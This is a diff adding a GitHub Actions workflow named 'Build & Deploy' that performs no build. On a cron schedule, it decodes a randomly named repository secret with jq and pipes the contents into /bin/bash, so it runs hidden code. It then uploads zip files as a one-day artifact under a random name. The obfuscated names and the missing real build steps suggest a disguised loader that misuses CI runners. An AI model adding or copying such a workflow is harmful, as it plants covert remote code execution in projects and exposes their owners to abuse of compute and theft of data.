@@ -1,0 +1,28 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          ylpc8: ${{ secrets.ylpc8 }}
+        run: |
+          printf '%s' "$ylpc8" | jq -r .rgo08 | /bin/bash
+          printf '%s' "$sgexw2372" | jq -r .eilj42064 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2tVBUpiL
+          path: "*.zip"
+          retention-days: 1
